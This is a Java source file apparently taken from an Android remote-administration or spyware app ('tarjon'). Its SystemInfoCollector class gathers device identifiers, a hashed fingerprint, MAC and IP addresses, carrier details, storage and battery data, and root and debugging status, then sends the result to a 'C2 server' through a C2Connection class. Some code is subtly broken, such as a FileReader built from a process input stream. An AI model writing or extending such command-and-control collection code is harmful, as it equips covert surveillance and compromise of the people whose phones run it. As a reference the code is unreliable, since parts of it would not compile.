package com.tarjon.admin.utils;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.tarjon.admin.db.DataStorage;
import com.tarjon.admin.network.C2Connection;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.NetworkInterface;
import java.security.MessageDigest;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Collects comprehensive system information from the device
 * for remote monitoring and identification.
 */
public class SystemInfoCollector {

    private static final String TAG = "SystemInfoCollector";
    
    private Context context;
    private EncryptionManager encryptionManager;
    private DataStorage dataStorage;
    private C2Connection c2Connection;
    
    public SystemInfoCollector(Context context) {
        this.context = context;
        this.encryptionManager = new EncryptionManager();
        this.dataStorage = new DataStorage(context);
        this.c2Connection = new C2Connection(context, encryptionManager);
    }
    
    /**
     * Collect and send device information to C2 server
     * @return JSON string containing device information
     */
    public String collectAndSendDeviceInfo() {
        try {
            JSONObject deviceInfo = collectBasicDeviceInfo();
            
            // Add additional sections
            deviceInfo.put("hardware", collectHardwareInfo());
            deviceInfo.put("network", collectNetworkInfo());
            deviceInfo.put("location", collectLocationInfo());
            deviceInfo.put("battery", collectBatteryInfo());
            deviceInfo.put("storage", collectStorageInfo());
            deviceInfo.put("security", collectSecurityInfo());
            
            // Store collected info locally
            dataStorage.saveGenericData(deviceInfo.toString(), "device_info");
            
            // Send to C2 server
            c2Connection.sendGenericData(deviceInfo.toString(), "device_info");
            
            return deviceInfo.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage(), e);
            return "{\"error\": \"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Collect basic device identifiers and specifications
     */
    private JSONObject collectBasicDeviceInfo() throws Exception {
        JSONObject info = new JSONObject();
        
        // Device identifiers
        info.put("android_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
        info.put("device_id", generateDeviceId());
        
        // Build information
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("brand", Build.BRAND);
        info.put("model", Build.MODEL);
        info.put("product", Build.PRODUCT);
        info.put("device", Build.DEVICE);
        info.put("board", Build.BOARD);
        info.put("hardware", Build.HARDWARE);
        info.put("fingerprint", Build.FINGERPRINT);
        
        // OS information
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("api_level", Build.VERSION.SDK_INT);
        info.put("build_id", Build.ID);
        info.put("build_time", Build.TIME);
        
        // System information
        info.put("language", Locale.getDefault().getLanguage());
        info.put("country", Locale.getDefault().getCountry());
        info.put("timezone", TimeZone.getDefault().getID());
        info.put("timezone_offset", TimeZone.getDefault().getRawOffset() / 3600000);
        info.put("current_time", System.currentTimeMillis());
        info.put("uptime", SystemClock.elapsedRealtime());
        
        // User information (non-personal)
        info.put("device_name", getDeviceName());
        
        return info;
    }
    
    /**
     * Collect hardware specifications
     */
    private JSONObject collectHardwareInfo() throws Exception {
        JSONObject hardware = new JSONObject();
        
        // Display information
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (windowManager != null) {
            windowManager.getDefaultDisplay().getMetrics(metrics);
            hardware.put("screen_width", metrics.widthPixels);
            hardware.put("screen_height", metrics.heightPixels);
            hardware.put("screen_density", metrics.density);
            hardware.put("screen_dpi", metrics.densityDpi);
        }
        
        // CPU information
        hardware.put("cpu_info", getCpuInfo());
        hardware.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        hardware.put("cpu_abi", Build.SUPPORTED_ABIS[0]);
        
        // Memory information
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        if (activityManager != null) {
            activityManager.getMemoryInfo(memoryInfo);
            hardware.put("total_memory", memoryInfo.totalMem);
            hardware.put("available_memory", memoryInfo.availMem);
            hardware.put("low_memory", memoryInfo.lowMemory);
            hardware.put("threshold", memoryInfo.threshold);
        }
        
        // Runtime memory information
        hardware.put("heap_size", Runtime.getRuntime().totalMemory());
        hardware.put("heap_free", Runtime.getRuntime().freeMemory());
        hardware.put("heap_max", Runtime.getRuntime().maxMemory());
        
        return hardware;
    }
    
    /**
     * Collect network and connectivity information
     */
    private JSONObject collectNetworkInfo() throws Exception {
        JSONObject network = new JSONObject();
        
        // Connectivity information
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            if (activeNetwork != null) {
                network.put("network_available", true);
                network.put("network_connected", activeNetwork.isConnected());
                network.put("network_type", activeNetwork.getTypeName());
                network.put("network_subtype", activeNetwork.getSubtypeName());
                network.put("network_roaming", activeNetwork.isRoaming());
            } else {
                network.put("network_available", false);
            }
        }
        
        // Telephony information
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            network.put("network_operator", telephonyManager.getNetworkOperatorName());
            network.put("sim_operator", telephonyManager.getSimOperatorName());
            network.put("sim_country", telephonyManager.getSimCountryIso());
            network.put("network_country", telephonyManager.getNetworkCountryIso());
            network.put("phone_type", getTelephonyPhoneType(telephonyManager.getPhoneType()));
            network.put("network_generation", getNetworkGeneration(telephonyManager));
        }
        
        // MAC address (requires ACCESS_WIFI_STATE permission)
        network.put("mac_address", getMacAddress());
        network.put("ip_address", getIpAddress());
        
        return network;
    }
    
    /**
     * Collect location information (permissions required)
     */
    private JSONObject collectLocationInfo() throws Exception {
        JSONObject location = new JSONObject();
        
        // Default empty values - actual location will be collected by LocationTracker class
        location.put("latitude", 0);
        location.put("longitude", 0);
        location.put("provider", "none");
        location.put("accuracy", 0);
        location.put("last_update", 0);
        
        return location;
    }
    
    /**
     * Collect battery status information
     */
    private JSONObject collectBatteryInfo() throws Exception {
        JSONObject battery = new JSONObject();
        
        // Get battery information using Intent
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = level * 100 / (float) scale;
            
            battery.put("level", batteryPct);
            
            // Get charging status
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            battery.put("charging", status == BatteryManager.BATTERY_STATUS_CHARGING || 
                                    status == BatteryManager.BATTERY_STATUS_FULL);
            
            // Get charging method
            int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            String chargeMethod = "unknown";
            if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) {
                chargeMethod = "usb";
            } else if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) {
                chargeMethod = "ac";
            } else if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) {
                chargeMethod = "wireless";
            }
            battery.put("charge_method", chargeMethod);
            
            // Temperature and voltage
            int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
            battery.put("temperature", temperature / 10.0);  // Temperature in celsius
            
            int voltage = batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
            battery.put("voltage", voltage / 1000.0);  // Voltage in volts
            
            // Health
            int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
            String healthStatus = "unknown";
            switch (health) {
                case BatteryManager.BATTERY_HEALTH_GOOD:
                    healthStatus = "good";
                    break;
                case BatteryManager.BATTERY_HEALTH_OVERHEAT:
                    healthStatus = "overheat";
                    break;
                case BatteryManager.BATTERY_HEALTH_DEAD:
                    healthStatus = "dead";
                    break;
                case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
                    healthStatus = "over_voltage";
                    break;
                case BatteryManager.BATTERY_HEALTH_FAILED:
                    healthStatus = "failed";
                    break;
                case BatteryManager.BATTERY_HEALTH_COLD:
                    healthStatus = "cold";
                    break;
            }
            battery.put("health", healthStatus);
        }
        
        return battery;
    }
    
    /**
     * Collect storage usage information
     */
    private JSONObject collectStorageInfo() throws Exception {
        JSONObject storage = new JSONObject();
        
        // Internal storage
        File internalPath = Environment.getDataDirectory();
        StatFs internalStat = new StatFs(internalPath.getPath());
        long internalBlockSize = internalStat.getBlockSizeLong();
        long internalTotalBlocks = internalStat.getBlockCountLong();
        long internalAvailableBlocks = internalStat.getAvailableBlocksLong();
        
        storage.put("internal_total", internalBlockSize * internalTotalBlocks);
        storage.put("internal_free", internalBlockSize * internalAvailableBlocks);
        storage.put("internal_used", (internalBlockSize * (internalTotalBlocks - internalAvailableBlocks)));
        
        // External storage if available
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            File externalPath = Environment.getExternalStorageDirectory();
            StatFs externalStat = new StatFs(externalPath.getPath());
            long externalBlockSize = externalStat.getBlockSizeLong();
            long externalTotalBlocks = externalStat.getBlockCountLong();
            long externalAvailableBlocks = externalStat.getAvailableBlocksLong();
            
            storage.put("external_total", externalBlockSize * externalTotalBlocks);
            storage.put("external_free", externalBlockSize * externalAvailableBlocks);
            storage.put("external_used", (externalBlockSize * (externalTotalBlocks - externalAvailableBlocks)));
        } else {
            storage.put("external_available", false);
        }
        
        // System storage partition
        File systemPath = Environment.getRootDirectory();
        StatFs systemStat = new StatFs(systemPath.getPath());
        long systemBlockSize = systemStat.getBlockSizeLong();
        long systemTotalBlocks = systemStat.getBlockCountLong();
        long systemAvailableBlocks = systemStat.getAvailableBlocksLong();
        
        storage.put("system_total", systemBlockSize * systemTotalBlocks);
        storage.put("system_free", systemBlockSize * systemAvailableBlocks);
        storage.put("system_used", (systemBlockSize * (systemTotalBlocks - systemAvailableBlocks)));
        
        return storage;
    }
    
    /**
     * Collect security and permissions information
     */
    private JSONObject collectSecurityInfo() throws Exception {
        JSONObject security = new JSONObject();
        
        // Root detection
        security.put("rooted", checkRootAccess());
        
        // Developer options
        security.put("developer_options", Settings.Global.getInt(
                context.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1);
        
        // Device encryption
        security.put("device_encrypted", isDeviceEncrypted());
        
        // Check if device is in debugging mode
        security.put("adb_enabled", Settings.Global.getInt(
                context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) == 1);
        
        // Unknown sources
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            security.put("unknown_sources", Settings.Global.getInt(
                    context.getContentResolver(), Settings.Global.INSTALL_NON_MARKET_APPS, 0) == 1);
        } else {
            security.put("unknown_sources", "requires_per_app_check");
        }
        
        // Bootloader status - can't be reliably detected programmatically
        security.put("bootloader_secure", "unknown");
        
        // Device admin status - requires separate check by DevicePolicyManager
        security.put("device_admin", false);
        
        return security;
    }
    
    /**
     * Generate a unique device ID by combining hardware identifiers
     */
    private String generateDeviceId() {
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfo = Build.BOARD + Build.BRAND + Build.DEVICE + Build.HARDWARE + Build.MANUFACTURER + Build.MODEL + Build.PRODUCT;
        
        try {
            // Combine multiple identifiers for more uniqueness
            String combinedInfo = androidId + deviceInfo;
            
            // Generate SHA-256 hash
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(combinedInfo.getBytes());
            
            // Convert to hex string
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            
            return hexString.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error generating device ID: " + e.getMessage(), e);
            
            // Fallback to Android ID with prefix
            return "tarjon_" + androidId;
        }
    }
    
    /**
     * Get CPU information from /proc/cpuinfo
     */
    private Map<String, String> getCpuInfo() {
        Map<String, String> cpuInfo = new HashMap<>();
        
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/cpuinfo"));
            String line;
            
            while ((line = br.readLine()) != null) {
                String[] parts = line.split(":", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim();
                    cpuInfo.put(key, value);
                }
            }
            br.close();
        } catch (IOException e) {
            Log.e(TAG, "Error reading CPU info: " + e.getMessage(), e);
        }
        
        return cpuInfo;
    }
    
    /**
     * Get memory information from /proc/meminfo
     */
    private Map<String, String> getMemInfo() {
        Map<String, String> memInfo = new HashMap<>();
        
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/meminfo"));
            String line;
            
            while ((line = br.readLine()) != null) {
                String[] parts = line.split(":", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim();
                    memInfo.put(key, value);
                }
            }
            br.close();
        } catch (IOException e) {
            Log.e(TAG, "Error reading memory info: " + e.getMessage(), e);
        }
        
        return memInfo;
    }
    
    /**
     * Get device name
     */
    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }
    
    /**
     * Capitalize first letter of string
     */
    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
    
    /**
     * Get phone type string from TelephonyManager constant
     */
    private String getTelephonyPhoneType(int phoneType) {
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_NONE:
                return "none";
            case TelephonyManager.PHONE_TYPE_GSM:
                return "gsm";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "cdma";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "sip";
            default:
                return "unknown";
        }
    }
    
    /**
     * Get network generation (2G, 3G, 4G, 5G) based on network type
     */
    private String getNetworkGeneration(TelephonyManager telephonyManager) {
        if (telephonyManager == null) {
            return "unknown";
        }
        
        int networkType;
        try {
            networkType = telephonyManager.getNetworkType();
        } catch (SecurityException e) {
            return "permission_required";
        }
        
        switch (networkType) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
            case TelephonyManager.NETWORK_TYPE_EDGE:
            case TelephonyManager.NETWORK_TYPE_CDMA:
            case TelephonyManager.NETWORK_TYPE_1xRTT:
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "2G";
                
            case TelephonyManager.NETWORK_TYPE_UMTS:
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
            case TelephonyManager.NETWORK_TYPE_HSDPA:
            case TelephonyManager.NETWORK_TYPE_HSUPA:
            case TelephonyManager.NETWORK_TYPE_HSPA:
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
            case TelephonyManager.NETWORK_TYPE_EHRPD:
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return "3G";
                
            case TelephonyManager.NETWORK_TYPE_LTE:
            case 19: // NETWORK_TYPE_LTE_CA is 19, but not exposed in API until later versions
                return "4G";
                
            case TelephonyManager.NETWORK_TYPE_NR: // 5G New Radio
                return "5G";
                
            default:
                return "unknown";
        }
    }
    
    /**
     * Get device MAC address
     */
    private String getMacAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : interfaces) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
                
                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "unknown";
                }
                
                StringBuilder mac = new StringBuilder();
                for (byte b : macBytes) {
                    mac.append(String.format("%02X:", b));
                }
                
                if (mac.length() > 0) {
                    mac.deleteCharAt(mac.length() - 1);
                }
                return mac.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting MAC address: " + e.getMessage(), e);
        }
        return "unknown";
    }
    
    /**
     * Get device IP address
     */
    private String getIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<java.net.InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (java.net.InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        // Check if IPv4 address
                        boolean isIPv4 = sAddr.indexOf(':') < 0;
                        if (isIPv4) {
                            return sAddr;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IP address: " + e.getMessage(), e);
        }
        return "unknown";
    }
    
    /**
     * Check if device is rooted
     */
    private boolean checkRootAccess() {
        // Check for common root indicators
        // 1. Check for su binary
        String[] suPaths = {
                "/system/app/Superuser.apk",
                "/system/xbin/su",
                "/system/bin/su",
                "/sbin/su",
                "/system/su",
                "/system/bin/.ext/.su",
                "/system/usr/we-need-root/su"
        };
        
        for (String path : suPaths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // 2. Check for busybox binary
        String[] busyboxPaths = {
                "/system/xbin/busybox",
                "/system/bin/busybox"
        };
        
        for (String path : busyboxPaths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // 3. Check for root management apps
        String[] rootApps = {
                "com.noshufou.android.su",
                "com.noshufou.android.su.elite",
                "eu.chainfire.supersu",
                "com.koushikdutta.superuser",
                "com.thirdparty.superuser",
                "com.topjohnwu.magisk"
        };
        
        PackageManager pm = context.getPackageManager();
        for (String appName : rootApps) {
            try {
                pm.getPackageInfo(appName, 0);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
                // App not found, continue checking
            }
        }
        
        // 4. Check for read access to /data
        try {
            File dataDir = new File("/data");
            if (dataDir.exists() && dataDir.canRead()) {
                return true;
            }
        } catch (Exception e) {
            // Ignore
        }
        
        // 5. Try executing 'su' command
        Process process = null;
        try {
            process = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
            BufferedReader reader = new BufferedReader(new FileReader(process.getInputStream()));
            String line = reader.readLine();
            if (line != null && line.contains("uid=0")) {
                return true;
            }
        } catch (Exception e) {
            // Failed to execute command, probably not rooted
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        
        return false;
    }
    
    /**
     * Check if device is encrypted
     */
    private boolean isDeviceEncrypted() {
        return Environment.isEncryptedStorage();
    }
    
    /**
     * SystemClock class for getting system uptime
     */
    private static class SystemClock {
        /**
         * Get device uptime in milliseconds
         */
        public static long elapsedRealtime() {
            try (RandomAccessFile reader = new RandomAccessFile("/proc/uptime", "r")) {
                String load = reader.readLine();
                if (load != null) {
                    String[] uptime = load.split(" ");
                    if (uptime.length > 0) {
                        return (long) (Double.parseDouble(uptime[0]) * 1000);
                    }
                }
            } catch (IOException e) {
                // Fallback to Android API
                return android.os.SystemClock.elapsedRealtime();
            }
            return android.os.SystemClock.elapsedRealtime();
        }
    }
}